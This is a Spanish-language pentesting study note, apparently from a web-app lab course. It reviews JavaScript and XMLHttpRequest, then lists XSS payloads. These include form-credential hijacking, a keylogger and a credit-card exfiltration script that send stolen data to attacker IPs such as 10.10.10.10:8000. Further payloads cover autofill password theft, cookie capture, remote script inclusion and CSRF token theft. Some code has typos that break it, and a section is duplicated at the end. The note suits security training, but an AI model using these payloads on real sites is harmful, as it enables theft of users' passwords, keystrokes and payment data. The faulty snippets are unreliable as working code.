# PENTESTING CON JAVASCRIPT

## INTRODUCCION

A partir de una vulnerabilidad XSS es posible realizar mas cosas en la victima, a continuacion se detallara posibles escenarios.

## Table of contents

- [PENTESTING CON JAVASCRIPT](#pentesting-con-javascript)
  - [INTRODUCCION](#introduccion)
  - [RECORDANDO JAVASCRIPT](#recordando-javascript)
    - [SINTAXIS BASICA](#sintaxis-basica)
    - [EVENTOS](#eventos)
    - [LISTENERS](#listeners)
    - [DOCUMENT OBJECT MODEL (DOM)](#document-object-model-dom)
      - [RELACION DE NODOS](#relacion-de-nodos)
    - [XMLHttpRequest](#xmlhttprequest)
  - [CROSS SITE SCRIPTING (XSS)](#cross-site-scripting-xss)
  - [MODIFICACION DE HTML (DATA TAMPERING)](#modificacion-de-html-data-tampering)
    - [podemos modificar contenido HTML usando una campo vulnerable a XSS](#podemos-modificar-contenido-html-usando-una-campo-vulnerable-a-xss)
    - [modificacion de todos los links de una pagina](#modificacion-de-todos-los-links-de-una-pagina)
    - [form data hijacking](#form-data-hijacking)
    - [Modified form field](#modified-form-field)
    - [Social Engineering](#social-engineering)
    - [OPERATING SYSTEM AND BROWSER DETECTION](#operating-system-and-browser-detection)
    - [CAPTURE ALL COOKIES](#capture-all-cookies)
    - [CAPTURE ALL CLICKS](#capture-all-clicks)
    - [KEYSTROKE LOGGING](#keystroke-logging)
    - [CONTROL EVENT LISTENER](#control-event-listener)
    - [INCLUDE EXTERNAL JS](#include-external-js)
    - [INCLUDE EXTERNAL JS USING JS](#include-external-js-using-js)
    - [REPLACE IMAGE](#replace-image)
    - [STEALING DATA FROM AUTO-COMPLETE](#stealing-data-from-auto-complete)
    - [POSTING DATA WITH XMLHttpRequest](#posting-data-with-xmlhttprequest)
    - [FETCHING DATA WITH XMLHttpRequest](#fetching-data-with-xmlhttprequest)
    - [DATA EXFILTRATION WITH XMLHttpRequest](#data-exfiltration-with-xmlhttprequest)
    - [CSRF TOKEN STEALING](#csrf-token-stealing)
    - [HTML PARSING OF XMLHttpRequest RESPONSE](#html-parsing-of-xmlhttprequest-response)
    - [MULTI LEVEL HTML PARSING](#multi-level-html-parsing)
    - [MULTI LEVEL JSON PARSING](#multi-level-json-parsing)
    - [MULTI LEVEL XML PARSING](#multi-level-xml-parsing)

## RECORDANDO JAVASCRIPT

### SINTAXIS BASICA

**Variables:**

```javascript
var //variables version antigua
let //variables version nueva (desde 2015)
const //constantes no cambia
```

diferencias entre Var y LET:

- Las variables definidas con `let`no se pueden volver a declarar.
- Las variables definidas con `let`deben declararse antes de su uso.
- Las variables definidas con `let`tienen ámbito de bloque.

**Funciones:**

```javascript
let x = myFunction(4, 3);   // llamamos a la funcion 
  
function myFunction(a, b) {  
  return a * b;             //retorno de la funcion
}
```

**Data types:**

```javascript
//strings
let carName1 = "Volvo XC60";
carName1.length;
carName1.toUpperCase();
carName1.toLowerCase();
carName1.substring(_start_, _end_);

let text1 = "Hello";  
let text2 = "World";  
let text3 = text1.concat(" ", text2);

//eliminar espacios
let text1 = "      Hello World!      ";  
let text2 = text1.trim();

//agregar caracteres al comienzo
//agegar 3 x 
let text = "5";  
let padded = text.padStart(4,"x"); //se pone uno mas de la cantidad que se quiere agregar

//agergar al final
let text = "5";  
let padded = text.padEnd(4,"x");

//obtener un caracter
let text = "HELLO WORLD";  
let char = text.charAt(0);

//dividir una cadena
text.split(",")

//buscar
let str = "Please locate where 'locate' occurs!";  
str.indexOf("locate");

let str = "Please locate where 'locate' occurs!";  
str.lastIndexOf("locate");

let str = "Please locate where 'locate' occurs!";  
str.search("locate");

/*
diferencia entre indexOf y search

-   El `search()`método no puede aceptar un segundo argumento de posición inicial.
-   El `indexOf()`método no puede tomar valores de búsqueda poderosos (expresiones regulares).
*/

//buscar con expresiones regulares
let text = "The rain in SPAIN stays mainly in the plain";  
text.match(/ain/g);

//verificar si tiene o no (boolean)
let text = "Hello world, welcome to the universe.";  
text.includes("world");

//comienza con (booleano)
let text = "Hello world, welcome to the universe.";  
text.startsWith("Hello");

let text = "John Doe";  
text.endsWith("Doe");
```

**mas metodos de strings:**

```javascript
//con barticks
let text =  
`The quick  
brown fox  
jumps over  
the lazy dog`;

//imprimir variables
let firstName = "John";  
let lastName = "Doe";  
let text = `Welcome ${firstName}, ${lastName}!`;

let price = 10;  
let VAT = 0.25;  
let total = `Total: ${(price * (1 + VAT)).toFixed(2)}`;

//codigo HTML
let header = "Templates Literals";  
let tags = ["template literals", "javascript", "es6"];  
  
let html = `<h2>${header}</h2><ul>`;  
for (const x of tags) {  
  html += `<li>${x}</li>`;  
}  
  
html += `</ul>`;

console.log(html);
```

**numeros:**

```javascript
//convertir a cadena
let x = 123;  
x.toString();

//redondear
let x = 9.656;  
x.toFixed(0);  
x.toFixed(2);  
x.toFixed(4);  
x.toFixed(6);

/*
conversion de variables a numeros

-   el `Number()`metodo
-   el `parseInt()`metodo
-   el `parseFloat()`metodo
*/

//metodo number convierte cualquier tipo de dato a numero
Number(true);  //1
Number(false); //0 
Number("10");  //10
Number("  10"); //10 
Number("10  ");  
Number(" 10  ");  
Number("10.33");  //Nan
Number("10,33");  //Nan
Number("10 33");  //Nan
Number("John"); //Nan
```

**Arrays:**

```javascript
const cars = ["Saab", "Volvo", "BMW"];

//o
const cars = [];  
cars[0]= "Saab";  
cars[1]= "Volvo";  
cars[2]= "BMW";

//desestructuracion

const [car1,car2,car3] = cars;
const [primero,,tercero]=cars;

const fruits = ["Banana", "Orange", "Apple", "Mango"];  
document.getElementById("demo").innerHTML = fruits.join(" * ");

//elimina el último elemento de un array
const fruits = ["Banana", "Orange", "Apple", "Mango"];  
fruits.pop();

const fruits = ["Banana", "Orange", "Apple", "Mango"];  
let fruit = fruits.pop();

//agrega al final
const fruits = ["Banana", "Orange", "Apple", "Mango"];  
fruits.push("Kiwi");

//El `shift()`método elimina el primer elemento de la matriz y "cambia" todos los demás elementos a un índice más bajo.
const fruits = ["Banana", "Orange", "Apple", "Mango"];  
fruits.shift();

const fruits = ["Banana", "Orange", "Apple", "Mango"];  
let fruit = fruits.shift(); //tengo el valor que se elimino

//agega al inicio
const fruits = ["Banana", "Orange", "Apple", "Mango"];  
fruits.unshift("Lemon");

//modificacion de valores
const fruits = ["Banana", "Orange", "Apple", "Mango"];  
fruits[2] = "Kiwi";

//concatenar
const myGirls = ["Cecilie", "Lone"];  
const myBoys = ["Emil", "Tobias", "Linus"];  
  
const myChildren = myGirls.concat(myBoys);

/*
agregar valors en medio

El primer parámetro (2) define la posición **en** la que se deben **agregar** (empalmar) nuevos elementos.

El segundo parámetro (0) define **cuántos** elementos se deben **eliminar** .

El resto de parámetros ("Limón", "Kiwi") definen los nuevos elementos a **añadir** .
*/

const fruits = ["Banana", "Orange", "Apple", "Mango"];  
fruits.splice(2, 0, "Lemon", "Kiwi");

//eliminar elemento con slice
/*
El primer parámetro (0) define la posición en la que se deben **agregar** (empalmar) nuevos elementos.

El segundo parámetro (1) define **cuántos** elementos se deben **eliminar** .

El resto de los parámetros se omiten. No se añadirán nuevos elementos.
*/
const fruits = ["Banana", "Orange", "Apple", "Mango"];  
fruits.splice(0, 1);

```

**Condicionales y bucles:**

```javascript
//condicionales
if (_condition1_) {  
  //  _block of code to be executed if condition1 is true_
} else if (_condition2_) {  
  //  _block of code to be executed if the condition1 is false and condition2 is true_  
} else {  
  //  _block of code to be executed if the condition1 is false and condition2 is false_
}
	
//switch
switch(_expression_) {  
  case _x_:  
    _// code block_    break;  
  case _y_:  
    _// code block_    break;  
  default:  
    // _code block_  
}

//bucles
//for
for (let i = 0; i < cars.length; i++) {  
  text += cars[i] + "<br>";  
}

//para objetos
const person = {fname:"John", lname:"Doe", age:25};  
  
let text = "";  
for (let x in person) {  
  text += person[x];  
}

//para arrays
const cars = ["BMW", "Volvo", "Mini"];  
  
let text = "";  
for (let x of cars) {  
  text += x;  
}

//while
while (i < 10) {  
  text += "The number is " + i;  
  i++;  
}
```

### EVENTOS

```javascript

<button onclick="displayDate()">Try it</button> //usando HTML

document.getElementById("myBtn").onclick = displayDate; //usando JS

//funcion
function displayDate() {
  document.getElementById("demo").innerHTML = Date();
}

```

- onchange
- onclick
- onmouseover
- onmouseout
- onload
- onkeydown

### LISTENERS

```javascript
document.getElementById("myBtn").addEventListener("click", displayDate); //listeners

//funcion
function displayDate() {
  document.getElementById("demo").innerHTML = Date();
}

//con parametros
document.getElementById("myBtn").addEventListener("click", function(){ myFunction(p1, p2); }); 
document.getElementById("myBtn").addEventListener("click", function(){ alert("Hello World!"); });
```

El `addEventListener()`método le permite agregar muchos eventos al mismo elemento, sin sobrescribir los eventos existentes:

```javascript
document.getElementById("myBtn").addEventListener("mouseover", myFunction);  
document.getElementById("myBtn").addEventListener("click", mySecondFunction);  
document.getElementById("myBtn").addEventListener("mouseout", myThirdFunction);
```

```javascript
document.getElementById("myBtn").removeEventListener("mousemove", myFunction);
```

### DOCUMENT OBJECT MODEL (DOM)

#### RELACION DE NODOS 

```html
<html>  
  
  <head>  
    <title>DOM Tutorial</title>  
  </head>  
  
  <body>  
    <h1>DOM Lesson one</h1>  
    <p id="id01">Hello world!</p>  
  </body>  
  
</html>
```

Desde el HTML anterior se puede leer:

-   `<html>` es el nodo raíz
-   `<html>` no tiene padres
-   `<html>` es el padre de `<head>` y `<body>`
-   `<head>` es el primer hijo de `<html>`
-   `<body>` es el ultimo hijo de `<html>`

y:

-   `<head>` tiene un hijo: `<title>`
-   `<title>` tiene un hijo (un nodo de texto): "Tutorial DOM"
-   `<body>` tiene dos hijos: `<h1>` y `<p>`
-   `<h1>` tiene un hijo: "Lección uno de DOM"
-   `<p>` tiene un hijo: "¡Hola mundo!"
-   `<h1>` y `<p>` son hermanos


```javascript
document.getElementsByTagName("p")[0].parentNode; //objeto body

document.getElementsByTagName("p")[0].childNodes; //array con los hijos (como estoy filtrando por tags especifico el indice)

document.getElementsByTagName("p")[0].childNodes[0].nodeValue; //Hello world!
document.getElementsByTagName("p")[0].firstChild.nodeValue; //Hello world!
document.getElementsByTagName("p")[0].lastChild.nodeValue; //Hello world! porqueno tengo mas que un hijo

document.getElementsByTagName("p")[0].previousElementSibling; // <h1>
document.getElementsByTagName("p")[0].previousElementSibling.innerHTML; //DOM Lesson one

document.getElementById("id01").nodeName; //p
```

**creacion de elementos:**

```html
<div id="div1">
<p id="p1">This is a paragraph.</p>
<p id="p2">This is another paragraph.</p>
</div>
```

```javascript
//creo el elemento
const para = document.createElement("p");
para.id="id1
//creo el contenido
const node = document.createTextNode("This is new.");
//inserto contenido en lemento
para.appendChild(node);
// agregamos dentro de div
const element = document.getElementById("div1");
element.appendChild(para);
```

```javascript
//creo el elemento
const para = document.createElement("p");
para.id="id1"
//creo el contenido
const node = document.createTextNode("This is new.");
//inserto contenido en lemento
para.appendChild(node);

// agregamos antes de p1
const element = document.getElementById("div1");
const child = document.getElementById("p1");
element.insertBefore(para, child);
```

eliminar elemento HTML:

```javascript   
const elmnt = document.getElementById("p1"); 
elmnt.remove();  
```

padre elinima un hijo:

```javascript
const parent = document.getElementById("div1");  
const child = document.getElementById("p1");  
parent.removeChild(child);
```

padre reemplaza a un hijo:

```javascript
const para = document.createElement("p");  
const node = document.createTextNode("This is new.");  
para.appendChild(node);  
  
const parent = document.getElementById("div1");  
const child = document.getElementById("p1");  
parent.replaceChild(para, child);
```

### XMLHttpRequest

El objeto `XMLHttpRequest` se puede utilizar para intercambiar datos con un servidor web en segundo plano. Esto significa que es posible actualizar partes de una página web sin recargar toda la página.

Todos los navegadores modernos (Chrome, Firefox, IE, Edge, Safari, Opera) tienen un objeto `XMLHttpRequest` integrado.

```javascript
let xhttp = new XMLHttpRequest();
```

callback: En este caso, la función de devolución de llamada debe contener el código para ejecutar **cuando la respuesta esté lista.**

```javascript
xhttp.onload = function() {  
  // que quieres que suceda cuando la respuesta este lista  
}
```

|EVENTO|DESCRIPCION|
|:-----:|:-----:|
|onload|Define una función que se llamará cuando se reciba (cargue) la solicitud|
|onreadystatechange|Define una función que se llamará cuando cambie la propiedad readyState|
|readyState|Contiene el estado de XMLHttpRequest. <br> 0: solicitud no inicializada <br> 1: conexión de servidor establecida <br> 2: solicitud recibida <br> 3: solicitud de procesamiento <br> 4: solicitud finalizada y respuesta lista|
|responseText| Devuelve los datos de respuesta como una cadena.|
|responseXML| Devuelve los datos de respuesta como datos XML|
|status| Devuelve el codigo de estado de una solicitud (200,301,401,404)|
|statusText|Devuelve el texto de estado (por ejemplo, "OK" o "Not Found")|

enviar una solicitud:

```javascript
xhttp.open("GET", "ajax_info.txt");  
xhttp.send();

//peticion asincrona
xhttp.open("GET", "ajax_info.txt", true);  
xhttp.send();

//ejemplo
xhttp.open("GET", "demo_get.asp?t=" + Math.random());  
xhttp.send();
```

metodo post:

```javascript
xhttp.open("POST", "ajax_test.asp");  
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");  
xhttp.send("fname=Henry&lname=Ford");
```

**Ejemplos:**

```javascript
function loadDoc() {  
  const xhttp = new XMLHttpRequest();  
  xhttp.onreadystatechange = function() {  
    if (this.readyState == 4 && this.status == 200) {  
      document.getElementById("demo").innerHTML =  
      this.responseText;  
    }  
  };  
  xhttp.open("GET", "ajax_info.txt");  
  xhttp.send();  
}
```

El evento `onreadystatechange` se activa cuatro veces (1-4), una vez por cada cambio en el estado listo. Por eso se controla con un if si el estado es 4 (respuesta lista)

**Respuesta XML:**

```javascript
const xhttp = new XMLHttpRequest();
xhttp.onload = function() {
  const xmlDoc = this.responseXML;
  const x = xmlDoc.getElementsByTagName("ARTIST");
  let txt = "";
  for (let i = 0; i < x.length; i++) {
    txt = txt + x[i].childNodes[0].nodeValue + "<br>";
  }
  document.getElementById("demo").innerHTML = txt;
}
xhttp.open("GET", "cd_catalog.xml");
xhttp.send();
```

Obtener los headers de la respuesta:

```javascript
const xhttp = new XMLHttpRequest();
xhttp.onload = function() {
  document.getElementById("demo").innerHTML =
  this.getAllResponseHeaders();
}
xhttp.open("GET", "ajax_info.txt");
xhttp.send();

//solo un header en especifico

const xhttp = new XMLHttpRequest();
xhttp.onload = function() {
  document.getElementById("demo").innerHTML =
  this.getResponseHeader("Content-type");
}
xhttp.open("GET", "ajax_info.txt");
xhttp.send();

```

## CROSS SITE SCRIPTING (XSS)

Es bueno conocer los diferentes tipos de XSS para poder entender mejor esto:

[[Cross Site Scripting (XSS)]]

## MODIFICACION DE HTML (DATA TAMPERING)

URL encodes/decoder online: [http://meyerweb.com/eric/tools/dencoder/](http://meyerweb.com/eric/tools/dencoder/)

para pasarlo por url.

### podemos modificar contenido HTML usando una campo vulnerable a XSS

```html
<script>
	
	document.GetElementById('name').innerHTML="Modified Text";
	document.GetElementByTagName('h2')[0].innerHTML="Modified Text";
	
</script>
```

### modificacion de todos los links de una pagina

```html
<script>
	
	let links = document.GetElementsByTagName("a");
	for (i=0;i<links.length;i++)
	{
		links[i].href="http://PentesterAcademy/topics";
	}
	
</script>
```

### form data hijacking

```html
<script>
	
	function interceptForm(){
		let username = document.forms[0].elements[0].value;
		let password = document.forms[0].elements[1].value;
		
		alert(username+" - "+password);
	}
	
	document.forms[0].onsubmit = interceptForm;
	
</script>
```

recibiendo la data en un servidor nuestro:

```html
<script>
	
	function interceptForm(){
		let username = document.forms[0].elements[0].value;
		let password = document.forms[0].elements[1].value;
		
		new Image().src = "http://10.10.10.10:8000/?user="+username+"&pass="+password;
	}
	
	document.forms[0].onsubmit = interceptForm;
	
</script>
```

KALI:

```bash
python -m SimpleHTTPServer
```

### Modified form field

```html
<form>
	<input id="user" type="text" name="user">
	<input id="password" type="password" name="p">
<form>
```

```javascript
//creo el elemento
const inp = document.createElement("input");
inp.setAttribute("id","pin");
inp.setAttribute("type","text");
inp.setAttribute("name","pin");
inp.setAttribute("placeholder","ATM PIN");

// agregamos despues del password
const element = document.forms[0];
const pass = document.getElementsByTagName("input")[1];
pass.after(inp);

//agregamos antes del password
element.insertBefore(inp,pass);
```

### Social Engineering

Remover el formulario y colocar un mensaje de "Pagina caida, por favor visite SecurityTube.com"

```html
<form>
	<input id="user" type="text" name="user">
	<input id="password" type="password" name="p">
<form>
```

```html
<script>
	
	//obtenemos el formulario
	const form = document.forms[0];
	//creamos elemento p
	const h1 = document.createElement("h1");
	const node = document.createTextNode("Pagina caida, por favor visite");
	h1.appendChild(node);
	//creamos elemento a
	const a = document.createElement("a");
	a.setAttribute("href","https://www.securityTube.com");
	const node2 = document.createTextNode("Este Link");
	a.appendChild(node2);
	//creamos div y agregamos p y a
	const div = document.createElement("div");
	div.appendChild(h1);
	div.appendChild(a);
	
	//agregamos despues del form
	form.after(div);
	
	//eliminamos form
	form.remove();
	
</script>
```

### OPERATING SYSTEM AND BROWSER DETECTION

nos basamos en el user-agent pero esto es facilmente editable.

```html
<script>
	let system = "No se pudo determinar el Sistema Operativo";
	if (navigator.appVersion.indexOf("Win")!=-1) system="Windows";
	if (navigator.appVersion.indexOf("Mac")!=-1) system="MacOS";
	if (navigator.appVersion.indexOf("X11")!=-1) system="UNIX";
	if (navigator.appVersion.indexOf("Linux")!=-1) system="Linux";
	
	alert(system);
	
</script>
```

viendo el objeto `navigator` podemos obtener otra informacion

### CAPTURE ALL COOKIES

```html
<script>
	let cookies=document.cookie.split(';')
	let resultado="";
	for(let i=0;i<cookies.length;i++)
	{
		let parser = cookies[i].split('=');
		let name=parser[0];
		let valor=parser[1];
		resultado+="nombre: "+name+" <---> valor: "+valor+"\n";
	}
	alert(resultado);
</script>
```

### CAPTURE ALL CLICKS

redireccionar todos los clicks en el body a google:

```html
<script>
	function atraparClicks(){
		location.href = "https://www.google.com";
	}

	document.body.addEventListener('click',atraparClicks,true);
</script>
```

o

```html
<script>
    function windowEvent(){
    	window.location.replace("http://pentesteracademy.com");
    }

    window.captureEvents(Event.CLICK);
    window.onclick=windowEvent;
</script>
```

el ultimo valor (true) indica que se ejecutara primero:

[https://stackoverflow.com/questions/7398290/unable-to-understand-usecapture-parameter-in-addeventlistener](https://stackoverflow.com/questions/7398290/unable-to-understand-usecapture-parameter-in-addeventlistener)

### KEYSTROKE LOGGING

```html
<script>
	//array con las letras
	let buffer = [];
	//IP atacante para enviar por GET
	let attacker_IP = "http://1.16.1.230:8000/?c=";
	//capturar lo que se escribe	
	document.onkeypress = (e)=>{
		let timestamp = Date.now() | 0;
		let keystroke = {
			k: e.key,
			t: timestamp
		};

		//agregar al array
		buffer.push(keystroke);
	}

	//enviar los datos cada 0.2 segundos
	windows.setInterval(()=>{
		if (buffer.length > 0)
		{
			let data = encodeURIComponent(JSON.stringfy(buffer));
			new Image().src = attacker_IP+data;
			//reset array
			buffer=[];
		}
	},200);
</script>
```

```html
<script>
	//capturar lo que se escribe
	document.onkeypress = (e)=>{
		
		let keystroke = String.fromCharCode(e.which);
		new Image().src = "http://1.16.1.230:8000/?c="+keystroke;
	}
</script>
```

### CONTROL EVENT LISTENER

podemos probar en los campos de un formulario inyectar codigo JS en caso de no encontrar un parametro URL vulnrable, por ejemplo intentar en el campo username de un fomrulario:

```javascript
admin"onmouseover="alert(1);
```

Podemos cambiar la funcion de un boton para que haga algo que queramos, por ejemplo el boton de un formulario que nos muestre la pass:

```html
<script>
	document.forms[0].onsubmit = () =>{
		let password = document.forms[0].elements[1].value;
		alert(password);
	}
</script>
```

### INCLUDE EXTERNAL JS

```html
<script src="http://demofilespa.s3.amazonaws.com/jfptest.js"></script>
```

contenido del script:

```javascript
windows.addEventListener("load",()=>{
	alert(document.cookie);
});
```

### INCLUDE EXTERNAL JS USING JS

```html
<script>
	let script = document.createElement("script");
    script.type = "text/javascript";
    script.src = "http://demofilespa.s3.amazonaws.com/jfptest.js";
    document.getElementsByTagName("head")[0].appendChild(script);
</script>
```

o lo agregamos al body:

```html
<script>
	let script = document.createElement("script");
    script.type = "text/javascript";
    script.src = "http://demofilespa.s3.amazonaws.com/jfptest.js";
    document.body.appendChild(script);
</script>
```

### REPLACE IMAGE

```html
<script>
	let image = document.etElementsByTagName("img")[0];
	image.src="lo que queramos"
</script>
```


### STEALING DATA FROM AUTO-COMPLETE

intente ingresar una combinación aleatoria de nombre de usuario: contraseña y haga clic en iniciar sesión. Cuando el navegador le pregunte si desea guardar la contraseña o no, haga clic en recordar contraseña. Entonces, lo que sucede es que la próxima vez que visitemos la página, el navegador completará automáticamente los campos de nombre de usuario: contraseña para nosotros.

Si las credenciales estan almacenadas en el navegador (guardadas ahi) es probable que al ingresar a la pagina se auto complete los campos de login, en un XSS almacenado si creamos un script que envie esos datos automaticamente es posible obtener credenciales:

```html
<script>
	let username = document.forms[0].elements[0].value;
	let password = document.forms[0].elements[1].value;
    window.setTimeout(() => {
		//cambiamos el action del form y lo enviamos
    	document.forms[0].action = "http://10.10.10.10:8000/?username="+username+"&password="+password;
    	document.forms[0].submit();
    }, 10000); //cada 10 segundos
</script>
```

### POSTING DATA WITH XMLHttpRequest

podemos enviarnos data por GET o cualquier otro verbo usando XMLHttpRequest tambien. el ejemplo anterior con esta sintaxis seria:

```html
<script>
	let username = document.forms[0].elements[0].value;
	let password = document.forms[0].elements[1].value;
    window.setTimeout(() => {
		
    	let req = XMLHttpRequest();
    	req.open("GET", "http://10.10.10.10:8000/?username="+username+"&password="+password, true); //true para que sea asincrono
    	req.send()
    }, 5000); 
</script>
```

### FETCHING DATA WITH XMLHttpRequest 

Imaginemos que a partir de un GET a esta ruta: **/lab/webapp/jfp/14/email?name=john** te retorna el email de **john**, queremos colocar la respuesta en un elemento existente con ID result

```html
<script>
	let req = new XMLHttpRequest();

	req.onreadystatechange = ()=>{
		//si hay respuesta exitosa
		if(request.readyState == 4 && req.status == 200)
		{
			//solo devuleve el correo como tal, sin estructura HTML, XML o JSON
			//colocamos al elemento con id = result
			document.getElementById("result").innerHTML=req.responseText;
		}
	};

	req.open("GET","/lab/webapp/jfp/14/email?name=john",true);
	req.send();
</script>
```

tambien podemos crear un elemento y agregarlo en el DOM con ese valor. Solo es cuestion de imaginar.

### DATA EXFILTRATION WITH XMLHttpRequest

vamos a ver como a partir de una peticion POST que nos devuelve un numero de tarjeta de credito podemos exfiltrar esa informacion a nuestro servidor en python.
La ruta **http://pentesteracademylab.appspot.com/lab/webapp/jfp/15/cardstore** devulve un numero de tarjeta cuando se le pasa el parametro **user=john** por POST.

```html
<script>
	let req1 = new XMLHttpRequest();

	req1.open("POST","http://pentesteracademylab.appspot.com/lab/webapp/jfp/15/cardstore",true);
	req1.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');

	req1.load = ()=>{
		let req2 = new XMLHttpRequest();
		req2.open("GET","http://10.10.10.10:8000/?card="+req1.responseText,true);
		req2.send();
	};
	
	req1.send("user=john");
</script>
```

```html
<script>
	let req1 = new XMLHttpRequest();

	req1.onreadystatechange = ()=>{
		//si hay respuesta exitosa
		if(request.readyState == 4 && req.status == 200)
		{
			let req2 = new XMLHttpRequest();
			req2.open("GET","http://10.10.10.10:8000/?card="+req1.responseText,true);
			req2.send();
		}
	};

	req1.open("POST","http://pentesteracademylab.appspot.com/lab/webapp/jfp/15/cardstore",true);
	req1.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
	req1.send("user=john");
</script>
```

### CSRF TOKEN STEALING

```html
<script>
        let request = new XMLHttpRequest();    
        request.onreadystatechange = function() {
            if (request.readyState == 4 && request.status == 200) {
                document.getElementById("result").innerHTML = request.responseText;
            }
        };

        //obtener el uid y token necesarios para la peticion
        let uid = document.getElementsByTagName("p")[0].innerHTML;
        let csrf_token = document.getElementsByTagName("p")[1].innerHTML;

        uid = uid.split(":")[1];
        csrf_token = csrf_token.split(":")[1];

        request.open("GET", "/lab/webapp/jfp/17/email?uid=" + uid + "&csrf_token=" + csrf_token, true);
        request.send();
</script>
```


### HTML PARSING OF XMLHttpRequest RESPONSE

```html
<script>
    var req = new XMLHttpRequest();
    req.onreadystatechange=function()
     {
      if (req.readyState==4 && req.status==200)
        {
         var html = req.responseXML;
         var address = html.getElementById("address").innerHTML;
        }
       document.getElementById("result").innerHTML = address;
     };
    req.open("GET", "/lab/webapp/jfp/18/address", true);
    //especifico que la respuesta sea HTML
    req.responseType = "document";
    req.send();    
    </script>
```

### MULTI LEVEL HTML PARSING

vamos a realizar una peticion y queremos que la respuesta nos la devuelva en formato HTML, para a partir de esa respuesta obtener un valor:

```html
<script>
        let xhr = new XMLHttpRequest();
        let xhr2 = new XMLHttpRequest();

        let csrf_token = '';
        let uid = '';  

        xhr2.onreadystatechange = function() {
             (xhr2.readyState == 4 && xhr2.status == 200) {
                let html = xhr2.responseXML;
                //obtengo la tarjeta de credito
                credit = html.getElementById("result").innerHTML;
                console.log(credit);
                //lo muestro en el HTML
                document.getElementById("result").innerHTML = credit;
            }
        }

        xhr.onreadystatechange = function() {
            if (xhr.readyState == 4 && xhr.status == 200) {
                let html2 = xhr.responseXML;
                //de la respuesta obtengo el token
                csrf_token = html2.forms[0].elements[1].value;
                alert(csrf_token);
                //mando otra peticion con el uid y el token obtenido
                xhr2.open("GET", "/lab/webapp/jfp/19/getcreditcard?uid=" + uid + "&csrf_token=" + csrf_token, true);
                xhr2.responseType = "document";
                xhr2.send();
            }
        }
        //obtengo el link
        let link = document.getElementById("settings");
        //del link filtro el uid
        let uid = link.innerHTML.split(":")[1];

        xhr.open("GET", link.href, true);
        //especifico que la respuesta sea HTML
        xhr.responseType = "document";
        xhr.send();
</script>
```

### MULTI LEVEL JSON PARSING

ejemplo de los json:

```json
{
	"params":{
		"id":5,
		"token":"abc123",
		"test":"test",
		"test":"test",
	}
}
```

```json
{
	"resp":{
		"id":5,
		"token":"abc123",
		"test":"test",
		"password":"P@$$w0rd!",
		"test":"test",
	}
}
```

```html
<script>
        let request = new XMLHttpRequest();
        request.onreadystatechange = function() {
            if ((request.readyState === 4) && (request.status === 200)) {
            	//la respuesta es JSON asi que la parseamos
                let items = JSON.parse(request.responseText);
                for (let keys in items) {
                    let tokenid = items[keys].token;
                    break;
                }
                let req = new XMLHttpRequest();
                req.onreadystatechange = function() {
                    if ((req.readyState === 4) && (req.status === 200)) {
                        let newitems = JSON.parse(req.responseText);
                        for (let key in newitems) {
                            pass = newitems[key].password;
                            alert(pass);
                            break;
                        }
                    }
                }
                req.open('GET', '/lab/webapp/jfp/20/getpassword?token=' + tokenid);
                req.send();
            }
        }
        request.open('GET', '/lab/webapp/jfp/20/gettoken?uid=3476');
        request.send();
</script>
```

otra alternativa:

```html
<script>
        let request = new XMLHttpRequest();
        request.onreadystatechange = function() {
            if ((request.readyState === 4) && (request.status === 200)) {
            	//la respuesta es JSON asi que la parseamos
                let items = JSON.parse(request.responseText);
                let tokenid = items.params.token;

                let req = new XMLHttpRequest();
                req.onreadystatechange = function() {
                    if ((req.readyState === 4) && (req.status === 200)) {
                        let newitems = JSON.parse(req.responseText);
                        pass = newitems.resp.password;
                        alert(pass);
                    }
                }

                req.open('GET', '/lab/webapp/jfp/20/getpassword?token=' + tokenid);
                req.send();
            }
        }
        request.open('GET', '/lab/webapp/jfp/20/gettoken?uid=3476');
        request.send();
</script>
```

### MULTI LEVEL XML PARSING

```xml
<apiendpoint>
	<id>Challenge 21</id>
	<endpoint>/lab/webapp/jfp/21/questions</endpoint>
	<params id="uid">
		<uid-param-description>User id of the user</uid-param-description>
		<uid-param-value>3423</uid-param-value>
	</params>
	<params id="token">
		<token-param-description>CSRF Token</token-param-description>
		<token-param-value>7535864923468</token-param-value>
	</params>
</apiendpoint>
```

```html
<script>
        let request = new XMLHttpRequest();
        request.onreadystatechange = function() {
            if ((request.readyState === 4) && (request.status === 200)) {
            	//obtener el endpoint
                let endpoint = request.responseXML.getElementsByTagName('endpoint')[0].firstChild.nodeValue;
                let uid = request.responseXML.getElementsByTagName('uid-param-value')[0].firstChild.nodeValue;
                let csrf_token = request.responseXML.getElementsByTagName('token-param-value')[0].firstChild.nodeValue;

                let req = new XMLHttpRequest();
                let url = endpoint + "?uid=" + uid + "&token=" + csrf_token;
                alert(url);
                req.open('GET', url);
                req.onreadystatechange = function() {
                    if ((req.readyState === 4) && (req.status === 200)) {
                    	
                      	let result = document.getElementById("result").innerHTML = req.responseText;
                    }
                }
                req.send()
            }
        }
        request.open('GET', '/lab/webapp/jfp/21/getxml');
        //para obtener un XML no es necesario especificar resposeType
        request.send();
 </script>
``` CAPTURE ALL CLICKS

redireccionar todos los clicks en el body a google:

```html
<script>
	function atraparClicks(){
		location.href = "https://www.google.com";
	}

	document.body.addEventListener('click',atraparClicks,true);
</script>
```

o

```html
<script>
    function windowEvent(){
    	window.location.replace("http://pentesteracademy.com");
    }

    window.captureEvents(Event.CLICK);
    window.onclick=windowEvent;
</script>
```

el ultimo valor (true) indica que se ejecutara primero:

[https://stackoverflow.com/questions/7398290/unable-to-understand-usecapture-parameter-in-addeventlistener](https://stackoverflow.com/questions/7398290/unable-to-understand-usecapture-parameter-in-addeventlistener)

